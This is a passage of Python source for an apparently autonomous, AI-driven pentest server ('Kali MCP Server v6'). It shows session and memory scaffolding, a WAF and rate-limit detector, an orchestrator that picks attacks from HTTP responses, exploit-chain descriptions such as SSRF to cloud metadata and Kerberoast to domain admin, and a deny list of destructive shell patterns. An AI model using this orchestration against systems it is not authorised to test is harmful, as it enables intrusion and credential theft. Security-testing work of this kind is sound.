#!/usr/bin/env python3
"""
Kali MCP Server v6 - Autonomous Pentest Engine
============================================================================
ARCHITECTURE: 20 Unified Mega-Modules (consolidated from 72 fragmented tools)

Each module is:
  - Parameterizable (depth: stealth/light/deep/aggressive, timeout, custom)
  - Context-aware (auto-adapts to detected stack: Java/Go/Node/PHP/Python)
  - Chain-capable (modules auto-trigger follow-up modules based on findings)
  - Rate-limit aware (detects WAF/429/Cloudflare and adapts speed)
  - Memory-persistent (retains findings across calls per target)

MODULES:
  1.  recon_engine         - Full target reconnaissance
  2.  web_assault          - Web attack surface analysis
  3.  injection_matrix     - All injection types unified
  4.  credential_cracker   - Unified cracking engine (hydra+john+hashcat+markov+entropy)
  5.  network_dominator    - Network attacks (ARP+SMB+bettercap+responder+NTLM)
  6.  wireless_audit       - WiFi pentest (aircrack+bettercap+PMKID+WPA+monitor)
  7.  cloud_siege          - Cloud attacks (AWS/GCS/Azure metadata+S3+SSRF chains)
  8.  ad_annihilator       - AD attacks (bloodhound+certipy+kerberoast+secretsdump)
  9.  api_breaker          - API exploitation (GraphQL+REST+Actuator+405 bypass)
  10. vuln_scanner_ultra   - Vulnerability scanning (nuclei+CVE map+correlation)
  11. exploit_engine       - Exploitation (metasploit+deser+log4shell+chains)
  12. auth_destroyer       - Auth bypass (JWT+IDOR+CORS+creds+headers)
  13. ssrf_hunter          - SSRF specialist (blind+DNS rebind+cloud meta+filter bypass)
  14. crypto_forensics     - Blockchain audit (smart contracts+DeFi+tx)
  15. osint_harvester      - OSINT (subdomains+DNS+domain intel+aggregation)
  16. post_exploit_ops     - Post-exploitation (pivot+persist+lateral+privesc+exfil)
  17. reporting_engine     - Reports (scope+audit+headers+PDF generation)
  18. autopilot_commander  - Autonomous orchestration (full auto pentest)
  19. session_ops          - Session management (start/health/summary/memory)
  20. payload_factory      - Payloads & utilities (generators+curl+commands+wpscan)

Author: Cabrel10 / MorningStar
License: MIT
Version: 6.0.0 - Unified Pentest Engine
"""

import asyncio
import subprocess
import json
import logging
import shlex
import tempfile
import os
import re
import datetime
import xml.etree.ElementTree as ET
import hashlib
import base64
import urllib.parse
import uuid
import time
import traceback
import socket
import threading
import struct
import math
from typing import Dict, Any, Optional, List, Tuple, Callable
from functools import wraps
from dataclasses import dataclass, asdict, field
from enum import Enum
from pathlib import Path
from collections import defaultdict

from fastmcp import FastMCP

# ============================================================================
# CONFIGURATION
# ============================================================================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
PAYLOADS_DIR = os.path.join(BASE_DIR, "payloads")
CVE_CACHE_DIR = os.path.join(BASE_DIR, "cve_cache")
CHAIN_DIR = os.path.join(BASE_DIR, "chain_results")

for d in [SESSIONS_DIR, PAYLOADS_DIR, CVE_CACHE_DIR, CHAIN_DIR]:
    os.makedirs(d, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[
        logging.FileHandler(os.path.join(BASE_DIR, "kali_mcp_server.log")),
        logging.StreamHandler(),
    ],
)
logger = logging.getLogger("KaliMCP")


# ============================================================================
# ENUMS AND DATA CLASSES
# ============================================================================

class ScanDepth(Enum):
    STEALTH = "stealth"
    LIGHT = "light"
    DEEP = "deep"
    AGGRESSIVE = "aggressive"

class VulnerabilityLevel(Enum):
    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class ToolStatus(Enum):
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"

@dataclass
class TraceEntry:
    timestamp: str
    level: str
    phase: str
    message: str
    data: Optional[Dict] = None

@dataclass
class ToolExecution:
    tool_name: str
    session_id: str
    target: str
    execution_id: str
    start_time: str
    end_time: Optional[str] = None
    status: str = "running"
    inputs: Dict = field(default_factory=dict)
    outputs: Dict = field(default_factory=dict)
    traces: List[Dict] = field(default_factory=list)
    progress: List[Dict] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    chained_from: Optional[str] = None
    chained_to: List[str] = field(default_factory=list)
    command_log: List[Dict] = field(default_factory=list)
    duration_seconds: float = 0.0


# ============================================================================
# INPUT VALIDATOR
# ============================================================================

class InputValidator:
    DANGEROUS_CHARS = ["`", "$", "|", ";", "&", ">", "<", "\n", "\r"]
    TARGET_PATTERN = re.compile(r"^[a-zA-Z0-9.\-_:/?=&%#@\[\]]+$")
    IP_PATTERN = re.compile(r"^(\d{1,3}\.){3}\d{1,3}(/\d{1,2})?$")
    DOMAIN_PATTERN = re.compile(
        r"^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?"
        r"(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$"
    )

    @classmethod
    def sanitize_target(cls, target: str) -> str:
        if not target:
            raise ValueError("Target cannot be empty")
        target = target.replace("\x00", "")
        injection_patterns = [
            r";\s*rm\s", r";\s*dd\s", r";\s*mkfs",
            r"\$\(", r"`.*`", r"\|\|.*rm",
            r">\s*/dev/", r";\s*shutdown", r";\s*reboot",
        ]
        for pattern in injection_patterns:
            if re.search(pattern, target, re.IGNORECASE):
                raise ValueError(f"Dangerous input detected: {target[:50]}")
        return target.strip()

    @classmethod
    def validate_command_args(cls, args: List[str]) -> List[str]:
        validated = []
        for arg in args:
            if isinstance(arg, str):
                if any(c in arg for c in ["`", "$(", "${"]) and not arg.startswith("-"):
                    raise ValueError(f"Shell metachar in argument: {arg[:50]}")
                validated.append(arg)
            else:
                validated.append(str(arg))
        return validated

    @classmethod
    def validate_timeout(cls, timeout: int, max_timeout: int = 7200) -> int:
        if not isinstance(timeout, (int, float)) or timeout < 1 or timeout > max_timeout:
            return min(max(int(timeout), 1), max_timeout)
        return int(timeout)

    @classmethod
    def validate_port(cls, port: int) -> int:
        if not isinstance(port, int) or port < 1 or port > 65535:
            raise ValueError(f"Invalid port: {port}")
        return port


# ============================================================================
# SESSION MANAGER
# ============================================================================

class SessionManager:
    def __init__(self):
        self.current_session_id = None
        self.sessions = {}
        self.executions = {}

    def create_session(self, name: Optional[str] = None) -> str:
        session_id = f"{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:8]}"
        session_dir = os.path.join(SESSIONS_DIR, session_id)
        os.makedirs(session_dir, exist_ok=True)
        self.current_session_id = session_id
        self.sessions[session_id] = {
            "id": session_id,
            "name": name or session_id,
            "created": datetime.datetime.now().isoformat(),
            "executions": [],
        }
        meta_path = os.path.join(session_dir, "session_meta.json")
        with open(meta_path, "w") as f:
            json.dump(self.sessions[session_id], f, indent=2)
        return session_id

    def get_session_id(self) -> str:
        if not self.current_session_id:
            self.create_session("auto_session")
        return self.current_session_id

    def start_execution(self, tool_name: str, target: str, inputs: Dict) -> ToolExecution:
        session_id = self.get_session_id()
        execution_id = f"{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:8]}"
        safe_target = re.sub(r"[^\w.\-]", "_", target.replace("://", "_"))[:100]
        exec_dir = os.path.join(SESSIONS_DIR, session_id, safe_target, tool_name, execution_id)
        os.makedirs(exec_dir, exist_ok=True)
        execution = ToolExecution(
            tool_name=tool_name,
            session_id=session_id,
            target=target,
            execution_id=execution_id,
            start_time=datetime.datetime.now().isoformat(),
            inputs=inputs,
        )
        self.executions[execution_id] = execution
        return execution

    def complete_execution(self, execution: ToolExecution, outputs: Dict, status: str = "completed"):
        execution.end_time = datetime.datetime.now().isoformat()
        execution.status = status
        execution.outputs = outputs
        start = datetime.datetime.fromisoformat(execution.start_time)
        end = datetime.datetime.fromisoformat(execution.end_time)
        execution.duration_seconds = (end - start).total_seconds()
        safe_target = re.sub(r"[^\w.\-]", "_", execution.target.replace("://", "_"))[:100]
        exec_dir = os.path.join(
            SESSIONS_DIR, execution.session_id, safe_target,
            execution.tool_name, execution.execution_id,
        )
        os.makedirs(exec_dir, exist_ok=True)
        trace_path = os.path.join(exec_dir, "trace.jsonl")
        with open(trace_path, "a") as f:
            record = {
                "execution_id": execution.execution_id,
                "tool": execution.tool_name,
                "target": execution.target,
                "status": execution.status,
                "duration": execution.duration_seconds,
                "start": execution.start_time,
                "end": execution.end_time,
                "inputs": {k: str(v)[:200] for k, v in execution.inputs.items()},
                "output_summary": str(outputs)[:500] if outputs else "",
            }
            f.write(json.dumps(record) + "\n")


# ============================================================================
# PENTEST MEMORY - Contextual memory across tool calls
# ============================================================================

class PentestMemory:
    def __init__(self):
        self._findings = defaultdict(lambda: defaultdict(list))
        self._decisions = defaultdict(list)
        self._context = defaultdict(dict)
        self._tech_stack = defaultdict(dict)

    def store_finding(self, target: str, tool: str, finding_type: str, data: Dict):
        entry = {
            "timestamp": datetime.datetime.now().isoformat(),
            "tool": tool,
            "type": finding_type,
            "data": data,
        }
        self._findings[target][finding_type].append(entry)
        logger.info(f"[MEMORY] Stored {finding_type} for {target} from {tool}")

    def store_tech(self, target: str, tech_data: Dict):
        self._tech_stack[target].update(tech_data)

    def get_tech(self, target: str) -> Dict:
        return dict(self._tech_stack.get(target, {}))

    def get_context(self, target: str) -> Dict:
        findings = self._findings.get(target, {})
        return {
            "target": target,
            "finding_types": list(findings.keys()),
            "total_findings": sum(len(v) for v in findings.values()),
            "decisions": self._decisions.get(target, []),
            "tech_stack": self.get_tech(target),
            "findings_summary": {
                k: len(v) for k, v in findings.items()
            },
        }

    def get_findings(self, target: str, finding_type: str = "") -> List[Dict]:
        if finding_type:
            return self._findings.get(target, {}).get(finding_type, [])
        all_findings = []
        for ftype, flist in self._findings.get(target, {}).items():
            all_findings.extend(flist)
        return all_findings

    def has_finding(self, target: str, finding_type: str, keyword: str = "") -> bool:
        findings = self._findings.get(target, {}).get(finding_type, [])
        if not keyword:
            return len(findings) > 0
        for f in findings:
            if keyword.lower() in json.dumps(f.get("data", {})).lower():
                return True
        return False

    def decide(self, target: str, decision: str, reason: str):
        self._decisions[target].append({
            "timestamp": datetime.datetime.now().isoformat(),
            "decision": decision,
            "reason": reason,
        })


# ============================================================================
# RATE LIMIT DETECTOR
# ============================================================================

class RateLimitDetector:
    def __init__(self):
        self._state = defaultdict(lambda: {
            "hits_429": 0, "waf_blocks": 0,
            "last_delay": 0.1, "backoff_level": 0,
        })

    def detect_from_response(self, target: str, status_code: int, headers: Dict) -> Dict:
        state = self._state[target]
        result = {"rate_limited": False, "waf_detected": False, "recommended_delay": state["last_delay"]}

        if status_code == 429:
            state["hits_429"] += 1
            state["backoff_level"] = min(state["backoff_level"] + 1, 5)
            result["rate_limited"] = True
            retry_after = headers.get("retry-after", headers.get("Retry-After", ""))
            if retry_after and retry_after.isdigit():
                result["recommended_delay"] = int(retry_after)
            else:
                result["recommended_delay"] = min(2 ** state["backoff_level"], 60)

        waf_headers = ["cf-ray", "x-sucuri-id", "x-aws-waf", "server"]
        for h in waf_headers:
            val = headers.get(h, "").lower()
            if any(w in val for w in ["cloudflare", "sucuri", "awselb", "imperva", "akamai"]):
                result["waf_detected"] = True
                state["waf_blocks"] += 1

        if status_code == 403 and state["waf_blocks"] > 2:
            state["backoff_level"] = min(state["backoff_level"] + 2, 5)
            result["recommended_delay"] = min(2 ** state["backoff_level"], 120)

        rate_headers = {k: v for k, v in headers.items() if "ratelimit" in k.lower() or "x-rate" in k.lower()}
        if rate_headers:
            result["rate_headers"] = rate_headers

        state["last_delay"] = result["recommended_delay"]
        return result

    def get_delay(self, target: str) -> float:
        return self._state[target]["last_delay"]

    def reset(self, target: str):
        if target in self._state:
            del self._state[target]


# ============================================================================
# INTELLIGENT ORCHESTRATOR - Brain that makes autonomous decisions
# ============================================================================

class IntelligentOrchestrator:
    def __init__(self, memory: PentestMemory, rate_detector: RateLimitDetector):
        self.memory = memory
        self.rate_detector = rate_detector

    # Stack-adapted configuration per technology
    STACK_CONFIGS = {
        "spring": {
            "endpoints": ["/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
                          "/actuator/configprops", "/actuator/beans", "/actuator/heapdump",
                          "/actuator/threaddump", "/actuator/loggers", "/actuator/metrics",
                          "/jolokia", "/h2-console", "/swagger-ui.html", "/v2/api-docs"],
            "vulns": ["log4shell", "spring4shell", "actuator_exposure", "h2_rce"],
            "headers": ["X-Application-Context"],
        },
        "django": {
            "endpoints": ["/admin/", "/__debug__/", "/api/schema/", "/static/"],
            "vulns": ["debug_mode", "ssti_jinja2", "orm_injection", "csrf_bypass"],
            "headers": ["X-Frame-Options"],
        },
        "express": {
            "endpoints": ["/.env", "/graphql", "/api-docs", "/swagger.json",
                          "/__coverage__", "/debug", "/status"],
            "vulns": ["prototype_pollution", "nosql_injection", "ssrf", "path_traversal"],
            "headers": ["X-Powered-By"],
        },
        "flask": {
            "endpoints": ["/console", "/debug", "/static/", "/api/"],
            "vulns": ["debug_console", "ssti_jinja2", "pickle_deser", "ssrf"],
            "headers": ["X-Powered-By"],
        },
        "php": {
            "endpoints": ["/wp-admin/", "/wp-config.php.bak", "/phpinfo.php",
                          "/administrator/", "/.htaccess", "/config.php.bak"],
            "vulns": ["lfi", "rfi", "type_juggling", "object_injection", "sqli"],
            "headers": ["X-Powered-By"],
        },
        "go": {
            "endpoints": ["/debug/pprof/", "/debug/vars", "/metrics", "/healthz", "/readyz"],
            "vulns": ["ssrf", "race_condition", "path_traversal"],
            "headers": [],
        },
        "aspnet": {
            "endpoints": ["/elmah.axd", "/trace.axd", "/_vti_bin/", "/web.config"],
            "vulns": ["viewstate_deser", "padding_oracle", "sqli", "xxe"],
            "headers": ["X-AspNet-Version", "X-Powered-By"],
        },
    }

    def analyze_response_code(self, target: str, endpoint: str, code: int, headers: Dict = None) -> List[Dict]:
        actions = []
        headers = headers or {}

        self.rate_detector.detect_from_response(target, code, headers)

        if code == 405:
            actions.append({
                "action": "method_enumeration",
                "reason": f"405 on {endpoint} - enumerate all HTTP methods",
                "methods": ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"],
                "priority": "high",
            })
        elif code == 422:
            actions.append({
                "action": "parameter_fuzzing",
                "reason": f"422 on {endpoint} - server expects specific JSON structure",
                "priority": "high",
                "techniques": ["json_body_fuzz", "content_type_switch", "param_discovery"],
            })
            # 422 often means Spring/FastAPI - check for actuator
            if not self.memory.has_finding(target, "stack_detected", "spring"):
                actions.append({
                    "action": "stack_detection",
                    "reason": "422 suggests Spring Boot or FastAPI - test actuator/docs endpoints",
                    "priority": "medium",
                })
        elif code == 403:
            actions.append({
                "action": "auth_bypass",
                "reason": f"403 on {endpoint} - attempt bypass techniques",
                "techniques": [
                    "path_mutation", "header_injection", "method_override",
                    "url_encoding", "case_switching", "double_encoding",
                ],
                "priority": "high",
            })
        elif code == 401:
            actions.append({
                "action": "auth_attack",
                "reason": f"401 on {endpoint} - test default creds and auth bypass",
                "priority": "high",
            })
        elif code == 500:
            actions.append({
                "action": "error_exploitation",
                "reason": f"500 on {endpoint} - server error may leak info",
                "techniques": ["stack_trace_analysis", "debug_mode_check", "error_based_sqli"],
                "priority": "medium",
            })
        elif code == 301 or code == 302:
            actions.append({
                "action": "redirect_analysis",
                "reason": f"{code} redirect - check for open redirect / SSRF",
                "priority": "medium",
            })

        # Cloud header detection
        for hdr, val in headers.items():
            hdr_lower = hdr.lower()
            if any(cloud in hdr_lower or cloud in str(val).lower()
                   for cloud in ["aws", "amazon", "x-amz", "goog", "azure", "x-ms"]):
                actions.append({
                    "action": "cloud_enumeration",
                    "reason": f"Cloud header detected: {hdr}={val}",
                    "priority": "high",
                })
                self.memory.store_finding(target, "orchestrator", "cloud_detected",
                                          {"header": hdr, "value": str(val)})
                break

        return actions

    def recommend_next_tools(self, target: str) -> List[Dict]:
        context = self.memory.get_context(target)
        recommendations = []

        if context["total_findings"] == 0:
            recommendations.append({"module": "recon_engine", "reason": "No findings yet - start with reconnaissance", "priority": 1})
            return recommendations

        finding_types = context["finding_types"]
        tech = context.get("tech_stack", {})

        if "open_ports" in finding_types and "web_vulns" not in finding_types:
            recommendations.append({"module": "web_assault", "reason": "Ports found, web not scanned yet", "priority": 1})

        if "web_vulns" in finding_types and "injections" not in finding_types:
            recommendations.append({"module": "injection_matrix", "reason": "Web vulns found, injections not tested", "priority": 1})

        if tech.get("framework") in ["spring", "spring-boot"]:
            recommendations.append({"module": "api_breaker", "reason": "Spring detected - test actuator/API endpoints", "priority": 1})

        if "cloud_detected" in finding_types:
            recommendations.append({"module": "cloud_siege", "reason": "Cloud infrastructure detected", "priority": 1})

        if any(f in finding_types for f in ["smb_shares", "netbios", "ldap"]):
            recommendations.append({"module": "ad_annihilator", "reason": "AD/SMB indicators found", "priority": 1})

        if "credentials" not in finding_types and context["total_findings"] > 5:
            recommendations.append({"module": "credential_cracker", "reason": "Multiple findings but no creds yet", "priority": 2})

        if "ssrf_potential" in finding_types:
            recommendations.append({"module": "ssrf_hunter", "reason": "SSRF potential detected", "priority": 1})

        return sorted(recommendations, key=lambda x: x["priority"])

    def adapt_to_stack(self, target: str) -> Dict:
        tech = self.memory.get_tech(target)
        framework = tech.get("framework", "unknown").lower()

        for stack_name, config in self.STACK_CONFIGS.items():
            if stack_name in framework:
                return {"stack": stack_name, "config": config, "adapted": True}

        return {"stack": "generic", "config": {"endpoints": [], "vulns": [], "headers": []}, "adapted": False}


# ============================================================================
# ADVANCED INTELLIGENCE ENGINE — Mythos-tier Analysis & Correlation
# ============================================================================

class KillChainPhase(Enum):
    """Lockheed Martin Cyber Kill Chain + MITRE ATT&CK mapping"""
    RECONNAISSANCE = "reconnaissance"
    WEAPONIZATION = "weaponization"
    DELIVERY = "delivery"
    EXPLOITATION = "exploitation"
    INSTALLATION = "installation"
    COMMAND_CONTROL = "command_and_control"
    ACTIONS_ON_OBJECTIVES = "actions_on_objectives"


@dataclass
class VulnFinding:
    """Structured vulnerability finding with CVSS scoring"""
    vuln_id: str
    title: str
    severity: str  # critical/high/medium/low/info
    cvss_score: float
    cvss_vector: str
    target: str
    port: int = 0
    service: str = ""
    evidence: str = ""
    exploitable: bool = False
    exploit_ref: str = ""
    kill_chain_phase: str = ""
    mitre_techniques: List[str] = field(default_factory=list)
    remediation: str = ""
    confidence: float = 0.8


class CVSSCalculator:
    """Dynamic CVSS v3.1 scoring from finding attributes"""

    ATTACK_VECTOR = {"network": 0.85, "adjacent": 0.62, "local": 0.55, "physical": 0.20}
    ATTACK_COMPLEXITY = {"low": 0.77, "high": 0.44}
    PRIVILEGES_REQUIRED = {"none": 0.85, "low": 0.62, "high": 0.27}
    USER_INTERACTION = {"none": 0.85, "required": 0.62}
    SCOPE = {"unchanged": 1.0, "changed": 1.08}
    IMPACT = {"high": 0.56, "low": 0.22, "none": 0.0}

    @classmethod
    def calculate(cls, av="network", ac="low", pr="none", ui="none",
                  scope="unchanged", conf="low", integ="low", avail="none") -> Tuple[float, str]:
        """Calculate CVSS 3.1 base score and vector string"""
        iss = 1.0 - (
            (1.0 - cls.IMPACT.get(conf, 0.0))
            * (1.0 - cls.IMPACT.get(integ, 0.0))
            * (1.0 - cls.IMPACT.get(avail, 0.0))
        )
        if iss <= 0:
            return 0.0, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N"

        if scope == "changed":
            impact = 7.52 * (iss - 0.029) - 3.25 * ((iss - 0.02) ** 15)
        else:
            impact = 6.42 * iss

        exploitability = (
            8.22
            * cls.ATTACK_VECTOR.get(av, 0.85)
            * cls.ATTACK_COMPLEXITY.get(ac, 0.77)
            * cls.PRIVILEGES_REQUIRED.get(pr, 0.85)
            * cls.USER_INTERACTION.get(ui, 0.85)
        )

        if impact <= 0:
            base_score = 0.0
        elif scope == "changed":
            base_score = min(1.08 * (impact + exploitability), 10.0)
        else:
            base_score = min(impact + exploitability, 10.0)

        base_score = math.ceil(base_score * 10) / 10

        vector = (
            f"CVSS:3.1/AV:{av[0].upper()}/AC:{ac[0].upper()}/PR:{pr[0].upper()}"
            f"/UI:{ui[0].upper()}/S:{scope[0].upper()}"
            f"/C:{conf[0].upper()}/I:{integ[0].upper()}/A:{avail[0].upper()}"
        )
        return base_score, vector

    @classmethod
    def severity_from_score(cls, score: float) -> str:
        if score >= 9.0: return "critical"
        if score >= 7.0: return "high"
        if score >= 4.0: return "medium"
        if score > 0.0: return "low"
        return "info"

    @classmethod
    def score_for_vuln_type(cls, vuln_type: str, context: Dict = None) -> Tuple[float, str, str]:
        """Pre-computed CVSS for common vulnerability types with context adjustment"""
        context = context or {}
        presets = {
            "rce": ("network", "low", "none", "none", "changed", "high", "high", "high"),
            "sqli": ("network", "low", "none", "none", "changed", "high", "high", "low"),
            "xss_stored": ("network", "low", "low", "required", "changed", "low", "low", "none"),
            "xss_reflected": ("network", "low", "none", "required", "changed", "low", "low", "none"),
            "lfi": ("network", "low", "none", "none", "unchanged", "high", "none", "none"),
            "ssrf": ("network", "low", "none", "none", "changed", "high", "low", "none"),
            "idor": ("network", "low", "low", "none", "unchanged", "high", "high", "none"),
            "ssti": ("network", "low", "none", "none", "changed", "high", "high", "high"),
            "cmdi": ("network", "low", "none", "none", "changed", "high", "high", "high"),
            "xxe": ("network", "low", "none", "none", "changed", "high", "low", "low"),
            "deserialization": ("network", "low", "none", "none", "changed", "high", "high", "high"),
            "log4shell": ("network", "low", "none", "none", "changed", "high", "high", "high"),
            "path_traversal": ("network", "low", "none", "none", "unchanged", "high", "none", "none"),
            "open_redirect": ("network", "low", "none", "required", "changed", "low", "low", "none"),
            "cors_misconfiguration": ("network", "low", "none", "required", "changed", "high", "none", "none"),
            "jwt_none_alg": ("network", "low", "none", "none", "unchanged", "high", "high", "none"),
            "default_credentials": ("network", "low", "none", "none", "unchanged", "high", "high", "high"),
            "smb_signing_disabled": ("adjacent", "high", "none", "none", "unchanged", "high", "high", "none"),
            "kerberoast": ("network", "low", "low", "none", "unchanged", "high", "none", "none"),
            "as_rep_roast": ("network", "low", "none", "none", "unchanged", "high", "none", "none"),
            "printnightmare": ("network", "low", "low", "none", "changed", "high", "high", "high"),
            "eternalblue": ("network", "high", "none", "none", "changed", "high", "high", "high"),
            "weak_cipher": ("network", "high", "none", "none", "unchanged", "high", "none", "none"),
            "missing_hsts": ("network", "high", "none", "required", "unchanged", "low", "low", "none"),
            "info_disclosure": ("network", "low", "none", "none", "unchanged", "low", "none", "none"),
        }
        params = presets.get(vuln_type, ("network", "low", "none", "none", "unchanged", "low", "none", "none"))
        score, vector = cls.calculate(*params)
        severity = cls.severity_from_score(score)
        # Context boost: internet-facing + no auth = higher effective risk
        if context.get("internet_facing") and context.get("no_auth"):
            score = min(score + 0.5, 10.0)
            severity = cls.severity_from_score(score)
        return score, vector, severity


class VulnCorrelator:
    """Cross-module vulnerability correlation and attack chain detection"""

    # Known exploit chains: if you find A + B → escalation path C
    EXPLOIT_CHAINS = [
        {
            "name": "SSRF → Cloud Metadata → IAM Takeover",
            "requires": ["ssrf", "cloud_detected"],
            "yields": "cloud_account_takeover",
            "severity": "critical",
            "description": "SSRF can reach cloud metadata endpoint (169.254.169.254) to steal IAM credentials",
            "mitre": ["T1190", "T1552.005", "T1078.004"],
        },
        {
            "name": "SQLi → Data Exfil → Credential Reuse",
            "requires": ["sqli", "open_ports"],
            "yields": "database_compromise",
            "severity": "critical",
            "description": "SQL injection enables data extraction; credentials may be reused across services",
            "mitre": ["T1190", "T1005", "T1078"],
        },
        {
            "name": "LFI → Source Code → Hardcoded Secrets",
            "requires": ["lfi", "web_vulns"],
            "yields": "credential_theft",
            "severity": "high",
            "description": "LFI reads application source code containing hardcoded API keys/passwords",
            "mitre": ["T1005", "T1552.001"],
        },
        {
            "name": "Default Creds → Admin Panel → RCE",
            "requires": ["default_credentials", "web_vulns"],
            "yields": "remote_code_execution",
            "severity": "critical",
            "description": "Default credentials grant admin access enabling code execution via file upload/template injection",
            "mitre": ["T1078.001", "T1059"],
        },
        {
            "name": "Kerberoast → Crack → Domain Admin",
            "requires": ["kerberoast", "credentials"],
            "yields": "domain_admin",
            "severity": "critical",
            "description": "Kerberoastable SPN tickets cracked offline grant high-privilege AD access",
            "mitre": ["T1558.003", "T1078.002"],
        },
        {
            "name": "SMB Relay → NTLM → Lateral Movement",
            "requires": ["smb_signing_disabled", "ntlm_hashes"],
            "yields": "lateral_movement",
            "severity": "high",
            "description": "SMB signing disabled enables NTLM relay attacks for lateral movement",
            "mitre": ["T1557.001", "T1021.002"],
        },
        {
            "name": "SSTI → RCE → Shell",
            "requires": ["ssti"],
            "yields": "remote_code_execution",
            "severity": "critical",
            "description": "Server-Side Template Injection directly yields code execution on the server",
            "mitre": ["T1190", "T1059"],
        },
        {
            "name": "Log4Shell → JNDI → Remote Class Loading",
            "requires": ["log4shell"],
            "yields": "remote_code_execution",
            "severity": "critical",
            "description": "Log4j JNDI injection enables loading remote classes for arbitrary code execution",
            "mitre": ["T1190", "T1203"],
        },
        {
            "name": "XXE → SSRF → Internal Service Access",
            "requires": ["xxe"],
            "yields": "internal_network_access",
            "severity": "high",
            "description": "XXE entity injection used to reach internal services (SSRF via XML)",
            "mitre": ["T1190", "T1018"],
        },
        {
            "name": "JWT None Alg → Auth Bypass → Privilege Escalation",
            "requires": ["jwt_none_alg"],
            "yields": "privilege_escalation",
            "severity": "critical",
            "description": "JWT algorithm confusion allows forging tokens with admin roles",
            "mitre": ["T1548", "T1134"],
        },
        {
            "name": "AS-REP Roast → Crack → Initial Access",
            "requires": ["as_rep_roast"],
            "yields": "domain_user_access",
            "severity": "high",
            "description": "Accounts without pre-auth yield crackable AS-REP hashes for domain access",
            "mitre": ["T1558.004", "T1078.002"],
        },
        {
            "name": "WPA Handshake → Crack → WiFi Access → Pivot",
            "requires": ["wpa_handshake"],
            "yields": "network_access",
            "severity": "high",
            "description": "Captured WPA handshake cracked for WiFi access enabling internal network pivot",
            "mitre": ["T1557", "T1021"],
        },
    ]

    # Service → vulnerability mapping for auto-detection
    SERVICE_VULN_MAP = {
        "ssh": {"checks": ["weak_creds", "cve_scan", "key_enum"], "common_cves": ["CVE-2024-6387"]},
        "ftp": {"checks": ["anonymous_login", "weak_creds", "bounce_attack"], "common_cves": ["CVE-2015-3306"]},
        "smb": {"checks": ["null_session", "eternalblue", "signing", "shares"], "common_cves": ["CVE-2017-0144"]},
        "http": {"checks": ["web_assault", "injection_matrix", "auth_destroyer"], "common_cves": []},
        "https": {"checks": ["tls_vulns", "web_assault", "injection_matrix"], "common_cves": []},
        "mysql": {"checks": ["weak_creds", "udf_exec", "file_read"], "common_cves": ["CVE-2012-2122"]},
        "mssql": {"checks": ["weak_creds", "xp_cmdshell", "linked_servers"], "common_cves": []},
        "rdp": {"checks": ["bluekeep", "weak_creds", "nla_bypass"], "common_cves": ["CVE-2019-0708"]},
        "ldap": {"checks": ["null_bind", "user_enum", "password_policy"], "common_cves": []},
        "dns": {"checks": ["zone_transfer", "cache_poison", "amplification"], "common_cves": []},
        "snmp": {"checks": ["community_strings", "walk", "rce"], "common_cves": []},
        "smtp": {"checks": ["open_relay", "vrfy_enum", "starttls"], "common_cves": []},
        "redis": {"checks": ["no_auth", "rce_module", "file_write"], "common_cves": []},
        "mongodb": {"checks": ["no_auth", "injection", "file_read"], "common_cves": []},
        "docker": {"checks": ["api_exposed", "privilege_escape", "mount_host"], "common_cves": []},
        "kubernetes": {"checks": ["api_unauth", "etcd_exposed", "kubelet_rce"], "common_cves": []},
        "winrm": {"checks": ["weak_creds", "exec_commands", "delegation"], "common_cves": []},
        "kerberos": {"checks": ["as_rep_roast", "kerberoast", "delegation"], "common_cves": []},
    }

    def __init__(self, memory: PentestMemory):
        self.memory = memory
        self._vuln_db: Dict[str, List[VulnFinding]] = defaultdict(list)
        self._chains_detected: Dict[str, List[Dict]] = defaultdict(list)

    def add_vulnerability(self, finding: VulnFinding):
        """Register a structured vulnerability finding"""
        self._vuln_db[finding.target].append(finding)
        self.memory.store_finding(finding.target, "vuln_correlator", finding.severity,
                                   {"vuln_id": finding.vuln_id, "title": finding.title,
                                    "cvss": finding.cvss_score, "exploitable": finding.exploitable})
        logger.info(f"[CORRELATOR] {finding.severity.upper()}: {finding.title} "
                     f"(CVSS {finding.cvss_score}) on {finding.target}:{finding.port}")

    def correlate(self, target: str) -> Dict:
        """Run full cross-module correlation analysis for a target"""
        findings = self.memory.get_context(target)
        finding_types = set(findings.get("finding_types", []))
        vulns = self._vuln_db.get(target, [])

        result = {
            "target": target,
            "total_vulns": len(vulns),
            "by_severity": {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0},
            "exploit_chains": [],
            "attack_surface_score": 0.0,
            "risk_rating": "unknown",
            "service_vulns": {},
            "recommended_attack_path": [],
            "mitre_coverage": [],
        }

        for v in vulns:
            result["by_severity"][v.severity] = result["by_severity"].get(v.severity, 0) + 1

        # Detect exploit chains
        for chain in self.EXPLOIT_CHAINS:
            if all(req in finding_types or
                   any(req in v.vuln_id or req in v.title.lower() for v in vulns)
                   for req in chain["requires"]):
                result["exploit_chains"].append({
                    "chain": chain["name"],
                    "severity": chain["severity"],
                    "description": chain["description"],
                    "mitre": chain["mitre"],
                    "yields": chain["yields"],
                })
                self._chains_detected[target].append(chain)

        # Attack surface scoring (0-100)
        score = 0.0
        score += result["by_severity"]["critical"] * 25
        score += result["by_severity"]["high"] * 15
        score += result["by_severity"]["medium"] * 5
        score += result["by_severity"]["low"] * 1
        score += len(result["exploit_chains"]) * 20
        score = min(score, 100.0)
        result["attack_surface_score"] = round(score, 1)

        if score >= 80: result["risk_rating"] = "CRITICAL"
        elif score >= 60: result["risk_rating"] = "HIGH"
        elif score >= 30: result["risk_rating"] = "MEDIUM"
        elif score > 0: result["risk_rating"] = "LOW"
